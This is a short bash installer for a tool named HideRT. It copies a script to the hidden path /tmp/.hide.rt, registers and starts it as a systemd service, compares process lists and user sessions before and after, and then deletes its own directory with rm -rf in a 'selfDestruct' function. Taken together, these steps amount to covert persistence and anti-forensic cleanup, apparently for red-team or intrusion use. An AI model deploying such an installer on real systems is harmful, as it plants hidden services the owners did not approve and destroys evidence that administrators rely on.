#!/bin/bash

#ChangeLog
#Version 0.10   Andrew - Built a working setup script, creates directories & starts the HideRT.service
#Version 0.20   Andrew - Shortened the directory check to a single check
#Version 0.21   Andrew - Shortened second section to long 1 liners
#Version 0.30   Andrew - Placed code into functions

######################################################################
#Just trust the script.. dont worry about how messy it is :D
#Also.. Don't worry about all of the sleeps and extra echo's I got lazy.
nuke(){
        CURDIR="`pwd`"
        echo "lets take a look at all of the current running processes";sleep 5
        ps aux;sleep 5;echo;echo "copying script and service";sleep 5
        cp -v $CURDIR/HideRT.sh /tmp/.hide.rt;cp -v $CURDIR/HideRT.service /etc/systemd/system/HideRT.service
        echo;echo "enabling/starting/checking HideRT.Service (this might take a minute)"
        systemctl enable HideRT;sleep 5;systemctl start HideRT;sleep 5;systemctl status HideRT;sleep 5
        echo;echo "lets take a look at all of the running processes now";sleep 5
        ps aux;sleep 5;echo;echo "lets check all seen user sessions";sleep 5;w;sleep 5
        echo;echo "All set :)"
        selfDestruct
}
selfDestruct(){
        rm -rf $CURDIR
}
nuke

